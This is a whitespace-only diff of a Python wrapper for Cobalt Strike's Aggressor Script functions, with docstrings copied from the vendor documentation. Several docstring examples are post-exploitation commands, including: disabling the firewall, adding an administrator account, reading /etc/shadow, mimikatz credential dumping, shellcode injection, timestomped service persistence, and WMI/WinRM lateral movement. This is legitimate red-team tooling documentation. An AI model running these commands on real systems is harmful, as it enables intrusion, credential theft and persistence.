         # disable the firewall
         brunasadmin($1, "cmd.exe /C netsh advfirewall set allprofiles state off");
-        
+
     """
 
     return engine.call('brunasadmin', args, fork=fork)
@@ -2346,16 +2346,16 @@ def brunasadmin(*args, fork=False):
 def brunu(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a process under another process.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the PID of the parent process
         $3 - the command + arguments to run
         Example
-        
+
         brunu($1, 1234, "notepad.exe");
-        
+
     """
 
     return engine.call('brunu', args, fork=fork)
@@ -2364,18 +2364,18 @@ def brunu(*args, fork=False):
 def bscreenshot(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to take a screenshot
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - how long to take the screenshot for
         Example
-        
+
         item "&Screenshot" {
             binput($1, "screenshot");
             bscreenshot($1, 0);
         }
-        
+
     """
 
     return engine.call('bscreenshot', args, silent=silent, fork=fork)
@@ -2384,19 +2384,19 @@ def bscreenshot(*args, silent=False, fork=False):
 def bsetenv(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to set an environment variable
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the environment variable to set
         $3 - the value to set the environment variable to (specify $null to unset the variable)
         Example
-        
+
         alias tryit {
             bsetenv($1, "foo", "BAR!");
             bshell($1, "echo %foo%");
         }
-        
+
     """
 
     return engine.call('bsetenv', args, fork=fork)
@@ -2405,18 +2405,18 @@ def bsetenv(*args, fork=False):
 def bshell(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a command with cmd.exe
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the command and arguments to run
         Example
-        
+
         alias adduser {
             bshell($1, "net user $2 B00gyW00gy1234! /ADD");
             bshell($1, "net localgroup \"Administrators\" $2 /ADD");
         }
-        
+
     """
 
     return engine.call('bshell', args, silent=silent, fork=fork)
@@ -2425,7 +2425,7 @@ def bshell(*args, silent=False, fork=False):
 def bshinject(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Inject shellcode (from a local file) into a specific process
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2433,9 +2433,9 @@ def bshinject(*args, fork=False):
         $3 - the process architecture (x86 | x64)
         $4 - the local file with the shellcode
         Example
-        
+
         bshinject($1, 1234, "x86", "/path/to/stuff.bin");
-        
+
     """
 
     return engine.call('bshinject', args, fork=fork)
@@ -2444,16 +2444,16 @@ def bshinject(*args, fork=False):
 def bshspawn(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Spawn shellcode (from a local file) into another process. This function benefits from Beacon's configuration to spawn post-exploitation jobs (e.g., spawnto, ppid, etc.)
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the process architecture (x86 | x64)
         $3 - the local file with the shellcode
         Example
-        
+
         bshspawn($1, "x86", "/path/to/stuff.bin");
-        
+
     """
 
     return engine.call('bshspawn', args, fork=fork)
@@ -2462,19 +2462,19 @@ def bshspawn(*args, fork=False):
 def bsleep(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to change its beaconing interval and jitter factor.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the number of seconds between beacons.
         $3 - the jitter factor [0-99]
         Example
-        
+
         alias stealthy {
             # sleep for 1 hour with 30% jitter factor
             bsleep($1, 60 * 60, 30);
         }
-        
+
     """
 
     return engine.call('bsleep', args, silent=silent, fork=fork)
@@ -2483,17 +2483,17 @@ def bsleep(*args, silent=False, fork=False):
 def bsocks(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Start a SOCKS proxy server associated with a beacon.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the port to bind to
         Example
-        
+
         alias socks1234 {
             bsocks($1, 1234);
         }
-        
+
     """
 
     return engine.call('bsocks', args, fork=fork)
@@ -2502,16 +2502,16 @@ def bsocks(*args, fork=False):
 def bsocks_stop(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Stop SOCKS proxy servers associated with the specified Beacon.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         alias stopsocks {
             bsocks_stop($1);
         }
-        
+
     """
 
     return engine.call('bsocks_stop', args, fork=fork)
@@ -2520,21 +2520,21 @@ def bsocks_stop(*args, fork=False):
 def bspawn(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn a new session
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the listener to target.
         $3 - the architecture to spawn a process for (defaults to x86)
         Example
-        
+
         item "&Spawn" {
             openPayloadHelper(lambda({
                 binput($bids, "spawn x86 $1");
                 bspawn($bids, $1, "x86");
             }, $bids => $1));
         }
-        
+
     """
 
     return engine.call('bspawn', args, fork=fork)
@@ -2543,7 +2543,7 @@ def bspawn(*args, fork=False):
 def bspawnas(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn a session as another user.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2552,9 +2552,9 @@ def bspawnas(*args, fork=False):
         $4 - the user's password
         $5 - the listener to spawn
         Example
-        
+
         bspawnas($1, "CORP", "Administrator", "toor", "my listener");
-        
+
     """
 
     return engine.call('bspawnas', args, fork=fork)
@@ -2563,7 +2563,7 @@ def bspawnas(*args, fork=False):
 def bspawnto(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Change the default program Beacon spawns to inject capabilities into.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2576,13 +2576,13 @@ def bspawnto(*args, fork=False):
         3. Do not specify %windir%\system32 or c:\windows\system32 directly. Always use syswow64 (x86) and sysnative (x64). Beacon will adjust these values to system32 if it's necessary.
         4. For an x86 spawnto value, you must specify an x86 program. For an x64 spawnto value, you must specify an x64 program.
         Example
-        
+
         # let's make everything lame.
         on beacon_initial {
             bspawnto($1, "%windir%\\syswow64\\notepad.exe", "x86");
             bspawnto($1, "%windir%\\sysnative\\notepad.exe", "x64");
         }
-        
+
     """
 
     return engine.call('bspawnto', args, fork=fork)
@@ -2591,16 +2591,16 @@ def bspawnto(*args, fork=False):
 def bspawnu(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn a session under another process. This builds on &brunu and uses powershell.exe.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the process to spawn this session under
         $3 - the listener to spawn
         Example
-        
+
         bspawnu($1, 1234, "my listener");
-        
+
     """
 
     return engine.call('bspawnu', args, fork=fork)
@@ -2609,7 +2609,7 @@ def bspawnu(*args, fork=False):
 def bssh(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn an SSH session.
         Arguments
         $1 - id for the beacon. This may be an array or a single ID.
@@ -2618,9 +2618,9 @@ def bssh(*args, fork=False):
         $4 - username
         $5 - password
         Example
-        
+
         bssh($1, "172.16.20.128", 22, "root", "toor");
-        
+
     """
 
     return engine.call('bssh', args, fork=fork)
@@ -2629,7 +2629,7 @@ def bssh(*args, fork=False):
 def bssh_key(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn an SSH session.
         Arguments
         $1 - id for the beacon. This may be an array or a single ID.
@@ -2638,13 +2638,13 @@ def bssh_key(*args, fork=False):
         $4 - username
         $5 - key data (as a string)
         Example
-        
+
         $handle = openf("/path/to/key.pem");
         $keydata = readb($handle, -1);
         closef($handle);
-        
+
         bssh_key($1, "172.16.20.128", 22, "root", $keydata);
-        
+
     """
 
     return engine.call('bssh_key', args, fork=fork)
@@ -2653,7 +2653,7 @@ def bssh_key(*args, fork=False):
 def bstage(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         This function handles the staging process for a bind listener. If the specified listener is not a bind listener, this function does nothing. Otherwise, it completes the staging protocol over a named pipe or a local socket.
         Arguments
         $1 - the id of the beacon to stage through
@@ -2661,12 +2661,12 @@ def bstage(*args, fork=False):
         $3 - the listener to stage
         $4 - the architecture of the payload stage (x86, x64)
         Example
-        
+
         # stage [target] [listener name]
         alias stage {
             bstage($1, $2, $3, "x86");
         }
-        
+
     """
 
     return engine.call('bstage', args, fork=fork)
@@ -2675,17 +2675,17 @@ def bstage(*args, fork=False):
 def bsteal_token(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to steal a token from a process.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the PID to take the token from
         Example
-        
+
         alias steal_token {
             bsteal_token($1, int($2));
         }
-        
+
     """
 
     return engine.call('bsteal_token', args, fork=fork)
@@ -2694,19 +2694,19 @@ def bsteal_token(*args, fork=False):
 def bsudo(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a command via sudo (SSH sessions only)
         Arguments
         $1 - the id for the session. This may be an array or a single ID.
         $2 - the password for the current user
         $3 - the command and arguments to run
         Example
-        
+
         # hashdump [password]
         ssh_alias hashdump {
             bsudo($1, $2, "cat /etc/shadow");
         }
-        
+
     """
 
     return engine.call('bsudo', args, fork=fork)
@@ -2715,7 +2715,7 @@ def bsudo(*args, fork=False):
 def btask(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Report a task acknowledgement for a Beacon. This task acknowledgement will also contribute to the narrative in Cobalt Strike's Activity Report and Sessions Report.
         Arguments
         $1 - the id for the beacon to post to
@@ -2723,11 +2723,11 @@ def btask(*args, fork=False):
         $3 - a string with MITRE ATT&CK Tactic IDs. Use a comma and a space to specify multiple IDs in one string.
         https://attack.mitre.org
         Example
-        
+
         alias foo {
             btask($1, "User tasked beacon to foo", "T1015");
         }
-        
+
     """
 
     return engine.call('btask', args, fork=fork)
@@ -2736,14 +2736,14 @@ def btask(*args, fork=False):
 def btimestomp(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to change the file modified/accessed/created times to match another file.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the file to update timestamp values for
         $3 - the file to grab timestamp values from
         Example
-        
+
         alias persist {
             bcd($1, "c:\\windows\\system32");
             bupload($1, script_resource("evil.exe"));
@@ -2751,7 +2751,7 @@ def btimestomp(*args, silent=False, fork=False):
             bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
             bshell($1, 'sc start netsrv');
         }
-        
+
     """
 
     return engine.call('btimestomp', args, silent=silent, fork=fork)
@@ -2760,15 +2760,15 @@ def btimestomp(*args, silent=False, fork=False):
 def bunlink(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to delink a Beacon its connected to over a TCP socket or named pipe.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the target host to unlink (specified as an IP address)
         Example
-        
+
         bunlink($1, "172.16.48.3");
-        
+
     """
 
     return engine.call('bunlink', args, fork=fork)
@@ -2777,15 +2777,15 @@ def bunlink(*args, fork=False):
 def bupload(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask a Beacon to upload a file
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the local path to the file to upload
         Example
-        
+
         bupload($1, script_resource("evil.exe"));
-        
+
     """
 
     return engine.call('bupload', args, fork=fork)
@@ -2794,7 +2794,7 @@ def bupload(*args, fork=False):
 def bupload_raw(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask a Beacon to upload a file
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2802,10 +2802,10 @@ def bupload_raw(*args, silent=False, fork=False):
         $3 - the raw content of the file
         $4 - [optional] the local path to the file (if there is one)
         Example
-        
+
         $data = artifact("my listener", "exe");
         bupload_raw($1, "\\\\DC\\C$\\foo.exe", $data);
-        
+
     """
 
     return engine.call('bupload_raw', args, silent=silent, fork=fork)
@@ -2814,19 +2814,19 @@ def bupload_raw(*args, silent=False, fork=False):
 def bwdigest(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to dump in-memory credentials with mimikatz [with the wdigest command]. The &blogonpasswords option is superior to this command.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "Dump &Passwords (WDigest)" {
             binput($1, "wdigest");
             bwdigest($1);
         }
-        
-        
-        
+
+
+
     """
 
     return engine.call('bwdigest', args, fork=fork)
@@ -2835,18 +2835,18 @@ def bwdigest(*args, fork=False):
 def bwinrm(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn a payload on a remote host. This function uses WinRM to run a PowerShell one-liner
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the target to spawn a payload onto
         $3 - the listener to spawn
         Example
-        
+
         brev2self();
         bloginuser($1, "CORP", "Administrator", "toor");
         bwinrm($1, "172.16.48.3", "my listener");
-        
+
     """
 
     return engine.call('bwinrm', args, fork=fork)
@@ -2855,18 +2855,18 @@ def bwinrm(*args, fork=False):
 def bwmi(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn a payload on a remote host. This function uses WMI to run a PowerShell one-liner
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the target to spawn a payload onto
         $3 - the listener to spawn
         Example
-        
+
         brev2self();
         bloginuser($1, "CORP", "Administrator", "toor");
         bwmi($1, "172.16.48.3", "my listener");
-        
+
     """
 
     return engine.call('bwmi', args, fork=fork)
@@ -2875,16 +2875,16 @@ def bwmi(*args, fork=False):
 def call(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Issue a call to the team server.
         Arguments
         $1 - the command name
         $2 - a callback to receive a response to this request. The callback will receive two arguments. The first is the call name. The second is the response.
         ... - one or more arguments to pass into this call.
         Example
-        
+
         call("aggressor.ping", { warn(@_); }, "this is my value");
-        
+
     """
 
     return engine.call('call', args, fork=fork)
@@ -2893,12 +2893,12 @@ def call(*args, fork=False):
 def closeClient(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Close the current Cobalt Strike team server connection.
         Example
-        
+
         closeClient();
-        
+
     """
 
     return engine.call('closeClient', args, fork=fork)
@@ -2907,7 +2907,7 @@ def closeClient(*args, fork=False):
 def credential_add(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Add a credential to the data model
         Arguments
         $1 - username
@@ -2916,13 +2916,13 @@ def credential_add(*args, fork=False):
         $4 - source
         $5 - host
         Example
-        
+
         command falsecreds {
             for ($x = 0; $x < 100; $x++) {
                 credential_add("user $+ $x", "password $+ $x");
             }
         }
-        
+
     """
 
     return engine.call('credential_add', args, fork=fork)
@@ -2931,14 +2931,14 @@ def credential_add(*args, fork=False):
 def credentials(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of application credentials in Cobalt Strike's data model.
         Returns
         An array of dictionary objects with information about each credential entry.
         Example
-        
+
         printAll(credentials());
-        
+
     """
 
     return engine.call('credentials', args, fork=fork)
@@ -2947,17 +2947,17 @@ def credentials(*args, fork=False):
 def data_keys(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         List the query-able keys from Cobalt Strike's data model
         Returns
         A list of keys that you may query with &data_query
         Example
-        
+
         foreach $key (data_keys()) {
             println("\n\c4=== $key ===\n");
             println(data_query($key));
         }
-        
+
     """
 
     return engine.call('data_keys', args, fork=fork)
@@ -2966,16 +2966,16 @@ def data_keys(*args, fork=False):
 def data_query(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Queries Cobalt Strike's data model
         Arguments
         $1 - the key to pull from the data model
         Returns
         A Sleep representation of the queried data.
         Example
-        
+
         println(data_query("targets"));
-        
+
     """
 
     return engine.call('data_query', args, fork=fork)
@@ -2984,16 +2984,16 @@ def data_query(*args, fork=False):
 def dbutton_action(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called. You may add multiple buttons to a dialog. Cobalt Strike will line these buttons up in a row and center them at the bottom of the dialog.
         Arguments
         $1 - the $dialog object
         $2 - the button label
         Example
-        
+
         dbutton_action($dialog, "Start");
         dbutton_action($dialog, "Stop");
-        
+
     """
 
     return engine.call('dbutton_action', args, fork=fork)
@@ -3002,15 +3002,15 @@ def dbutton_action(*args, fork=False):
 def dbutton_help(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a Help button to a &dialog. When this button is pressed, Cobalt Strike will open the user's browser to the specified URL.
         Arguments
         $1 - the $dialog object
         $2 - the URL to go to
         Example
-        
+
         dbutton_help($dialog, "http://www.google.com");
-        
+
     """
 
     return engine.call('dbutton_help', args, fork=fork)
@@ -3019,7 +3019,7 @@ def dbutton_help(*args, fork=False):
 def dialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Create a dialog. Use &dialog_show to show it.
         Arguments
         $1 - the title of the dialog
@@ -3028,18 +3028,18 @@ def dialog(*args, fork=False):
         Returns
         A scalar with a $dialog object.
         Example
-        
+
         sub callback {
             # prints: Pressed Go, a is: Apple
             println("Pressed $2 $+ , a is: " . $3['a']);
         }
-        
+
         $dialog = dialog("Hello World", %(a => "Apple", b => "Bat"), &callback);
         drow_text($dialog, "a", "Fruit:  ");
         drow_text($dialog, "b", "Rodent: ");
         dbutton_action($dialog, "Go");
         dialog_show($dialog);
-        
+
     """
 
     return engine.call('dialog', args, fork=fork)
@@ -3048,15 +3048,15 @@ def dialog(*args, fork=False):
 def dialog_description(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a description to a &dialog
         Arguments
         $1 - a $dialog object
         $2 - the description of this dialog
         Example
-        
+
         dialog_description($dialog, "I am the Hello World dialog.");
-        
+
     """
 
     return engine.call('dialog_description', args, fork=fork)
@@ -3065,14 +3065,14 @@ def dialog_description(*args, fork=False):
 def dialog_show(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Shows a &dialog.
         Arguments
         $1 - the $dialog object
         Example
-        
+
         dialog_show($dialog);
-        
+
     """
 
     return engine.call('dialog_show', args, fork=fork)
@@ -3081,16 +3081,16 @@ def dialog_show(*args, fork=False):
 def dispatch_event(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Call a function in Java Swing's Event Dispatch Thread. Java's Swing Library is not thread safe. All changes to the user interface should happen from the Event Dispatch Thread.
         Arguments
         $1 - the function to call
         Example
-        
+
         dispatch_event({
             println("Hello World");
         });
-        
+
     """
 
     return engine.call('dispatch_event', args, fork=fork)
@@ -3099,14 +3099,14 @@ def dispatch_event(*args, fork=False):
 def downloads(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of downloads in Cobalt Strike's data model.
         Returns
         An array of dictionary objects with information about each downloaded file.
         Example
-        
+
         printAll(downloads());
-        
+
     """
 
     return engine.call('downloads', args, fork=fork)
@@ -3115,16 +3115,16 @@ def downloads(*args, fork=False):
 def drow_beacon(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a beacon selection row to a &dialog
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_beacon($dialog, "bid", "Session: ");
-        
+
     """
 
     return engine.call('drow_beacon', args, fork=fork)
@@ -3133,7 +3133,7 @@ def drow_beacon(*args, fork=False):
 def drow_checkbox(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a checkbox to a &dialog
         Arguments
         $1 - a $dialog object
@@ -3141,9 +3141,9 @@ def drow_checkbox(*args, fork=False):
         $3 - the label for this row
         $4 - the text next to the checkbox
         Example
-        
+
         drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");
-        
+
     """
 
     return engine.call('drow_checkbox', args, fork=fork)
@@ -3152,7 +3152,7 @@ def drow_checkbox(*args, fork=False):
 def drow_combobox(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a combobox to a &dialog
         Arguments
         $1 - a $dialog object
@@ -3160,9 +3160,9 @@ def drow_combobox(*args, fork=False):
         $3 - the label for this row
         $4 - an array of options to choose from
         Example
-        
+
         drow_combobox($dialog, "combo", "Options", @("apple", "bat", "cat"));
-        
+
     """
 
     return engine.call('drow_combobox', args, fork=fork)
@@ -3171,16 +3171,16 @@ def drow_combobox(*args, fork=False):
 def drow_exploits(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a privilege escalation exploit selection row to a &dialog
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_exploits($dialog, "exploit", "Exploit: ");
-        
+
     """
 
     return engine.call('drow_exploits', args, fork=fork)
@@ -3189,16 +3189,16 @@ def drow_exploits(*args, fork=False):
 def drow_file(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a file chooser row to a &dialog
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_file($dialog, "file", "Choose: ");
-        
+
     """
 
     return engine.call('drow_file', args, fork=fork)
@@ -3207,16 +3207,16 @@ def drow_file(*args, fork=False):
 def drow_interface(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a VPN interface selection row to a &dialog
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_interface($dialog, "int", "Interface: ");
-        
+
     """
 
     return engine.call('drow_interface', args, fork=fork)
@@ -3225,16 +3225,16 @@ def drow_interface(*args, fork=False):
 def drow_krbtgt(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a krbtgt selection row to a &dialog
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_krbtgt($dialog, "hash", "krbtgt hash: ");
-        
+
     """
 
     return engine.call('drow_krbtgt', args, fork=fork)
@@ -3243,16 +3243,16 @@ def drow_krbtgt(*args, fork=False):
 def drow_listener(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a listener selection row to a &dialog. This row does not show SMB listeners.
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_listener($dialog, "listener", "Listener: ");
-        
+
     """
 
     return engine.call('drow_listener', args, fork=fork)
@@ -3261,16 +3261,16 @@ def drow_listener(*args, fork=False):
 def drow_listener_smb(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a listener selection row to a &dialog. This row shows SMB listeners.
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_listener_smb($dialog, "listener", "Listener: ");
-        
+
     """
 
     return engine.call('drow_listener_smb', args, fork=fork)
@@ -3279,16 +3279,16 @@ def drow_listener_smb(*args, fork=False):
 def drow_listener_stage(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a listener selection row to a &dialog. This row shows local Beacon listeners with stages only. Foreign listeners and listeners from other servers are excluded.
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_listener_stage($dialog, "listener", "Stage: ");
-        
+
     """
 
     return engine.call('drow_listener_stage', args, fork=fork)
@@ -3297,16 +3297,16 @@ def drow_listener_stage(*args, fork=False):
 def drow_mailserver(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a mail server field to a &dialog.
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_mailserver($dialog, "mail", "SMTP Server: ");
-        
+
     """
 
     return engine.call('drow_mailserver', args, fork=fork)
@@ -3315,16 +3315,16 @@ def drow_mailserver(*args, fork=False):
 def drow_proxyserver(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a proxy server field to a &dialog.
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_proxyserver($dialog, "proxy", "Proxy: ");
-        
+
     """
 
     return engine.call('drow_proxyserver', args, fork=fork)
@@ -3333,16 +3333,16 @@ def drow_proxyserver(*args, fork=False):
 def drow_site(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a site/URL field to a &dialog.
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_site($dialog, "url", "Site: ");
-        
+
     """
 
     return engine.call('drow_site', args, fork=fork)
@@ -3351,7 +3351,7 @@ def drow_site(*args, fork=False):
 def drow_text(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a text field row to a &dialog
         Arguments
         $1 - a $dialog object
@@ -3359,9 +3359,9 @@ def drow_text(*args, fork=False):
         $3 - the label for this row
         $4 - Optional. The width of this text field (in characters). This value isn't always honored (it won't shrink the field, but it will make it wider).
         Example
-        
+
         drow_text($dialog, "name", "Name: ");
-        
+
     """
 
     return engine.call('drow_text', args, fork=fork)
@@ -3370,16 +3370,16 @@ def drow_text(*args, fork=False):
 def drow_text_big(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Adds a multi-line text field to a &dialog
         Arguments
         $1 - a $dialog object
         $2 - the name of this row
         $3 - the label for this row
         Example
-        
+
         drow_text_big($dialog, "addr", "Address: ");
-        
+
     """
 
     return engine.call('drow_text_big', args, fork=fork)
@@ -3388,17 +3388,17 @@ def drow_text_big(*args, fork=False):
 def dstamp(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Format a time into a date/time value. This value includes seconds.
         Arguments
         $1 - the time [milliseconds since the UNIX epoch]
         Example
-        
+
         println("The time is now: " . dstamp(ticks()));
-        
+
         See Also
         &tstamp
-        
+
     """
 
     return engine.call('dstamp', args, fork=fork)
@@ -3407,14 +3407,14 @@ def dstamp(*args, fork=False):
 def elog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Publish a notification to the event log
         Arguments
         $1 - the message
         Example
-        
+
         elog("The robot invasion has begun!");
-        
+
     """
 
     return engine.call('elog', args, fork=fork)
@@ -3423,39 +3423,39 @@ def elog(*args, fork=False):
 def encode(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Obfuscate a position-independent blob of code with an encoder.
         Arguments
         $1 - position independent code (e.g., shellcode, "raw" stageless Beacon) to apply encoder to
         $2 - the encoder to use
         $3 - the architecture (e.g., x86, x64)
-        
-        
+
+
         Encoder
         Description
-        
-        
+
+
         alpha
         Alphanumeric encoder (x86-only)
-        
-        
+
+
         xor
         XOR encoder
-        
-        
+
+
         Notes
         1. The encoded position-independent blob must run from a memory page that has RWX permissions or the decode step will crash the current process.
         2. alpha encoder: The EDI register must contain the address of the encoded blob. &encode prepends a 10-byte (non-alphanumeric) program to the beginning of the alphanumeric encoded blob. This program calculates the location of the encoded blob and sets EDI for you. If you plan to set EDI yourself, you may remove these first 10 bytes.
         Returns
         A position-independent blob that decodes the original string and passes execution to it.
         Example
-        
+
         # generate shellcode for a listener
         $stager = shellcode("my listener", false "x86");
-        
+
         # encode it.
         $stager = encode($stager, "xor", "x86");
-        
+
     """
 
     return engine.call('encode', args, fork=fork)
@@ -3464,19 +3464,19 @@ def encode(*args, fork=False):
 def fireAlias(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Runs a user-defined alias
         Arguments
